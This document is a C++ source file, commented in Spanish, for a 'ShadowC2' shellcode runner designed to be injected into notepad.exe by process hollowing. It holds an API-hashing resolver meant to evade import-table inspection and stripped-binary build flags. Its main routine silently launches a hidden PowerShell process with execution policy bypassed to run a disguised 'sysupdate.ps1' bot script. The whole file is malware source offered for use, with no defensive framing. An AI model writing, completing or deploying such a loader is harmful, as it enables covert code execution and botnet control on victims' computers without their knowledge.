/**
 * ShadowC2 - Shellcode Runner (se inyecta via Process Hollowing)
 * Este PE pequeño se inyecta en notepad.exe
 * Compilar: x86_64-w64-mingw32-g++ -o shellcode_runner.exe shellcode_runner.cpp \
 *           -lwininet -s -O2 -static -nostdlib -Wl,--entry,main \
 *           -fno-asynchronous-unwind-tables
 */

#include <windows.h>

// Funciones resueltas dinámicamente para evadir IAT
typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, 
    BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

// Hash simple
DWORD hash(const char* s) {
    DWORD h = 0x1505;
    while (*s) h = ((h << 5) + h) + *s++;
    return h;
}

// Resolver API por hash
PVOID resolve_api(HMODULE hMod, DWORD h) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + 
        nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    
    PDWORD names = (PDWORD)((BYTE*)hMod + exp->AddressOfNames);
    PWORD ords = (PWORD)((BYTE*)hMod + exp->AddressOfNameOrdinals);
    PDWORD funcs = (PDWORD)((BYTE*)hMod + exp->AddressOfFunctions);
    
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)hMod + names[i]);
        DWORD hh = 0x1505;
        while (*name) hh = ((hh << 5) + hh) + *name++;
        if (hh == h) return (PVOID)((BYTE*)hMod + funcs[ords[i]]);
    }
    return nullptr;
}

// Shellcode principal - ejecuta PowerShell con bot.ps1
extern "C" void main() {
    // Resolver kernel32 APIs
    HMODULE hKernel = GetModuleHandleA("kernel32.dll");
    
    pCreateFileA CreateFileA = (pCreateFileA)GetProcAddress(hKernel, "CreateFileA");
    pWriteFile WriteFile = (pWriteFile)GetProcAddress(hKernel, "WriteFile");
    pCloseHandle CloseHandle = (pCloseHandle)GetProcAddress(hKernel, "CloseHandle");
    pCreateProcessA CreateProcessA = (pCreateProcessA)GetProcAddress(hKernel, "CreateProcessA");
    pLoadLibraryA LoadLibraryA = (pLoadLibraryA)GetProcAddress(hKernel, "LoadLibraryA");
    pGetProcAddress GetProcAddress = (pGetProcAddress)GetProcAddress(hKernel, "GetProcAddress");
    
    // Payload PowerShell embebido (se reemplaza al compilar)
    // En producción, esto se descarga o se pasa como parámetro
    const char* psCmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile "
        "-File C:\\Users\\Public\\sysupdate.ps1";
    
    // Ejecutar
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    
    CreateProcessA(NULL, (LPSTR)psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    // Salir limpio
    ExitProcess(0);
}
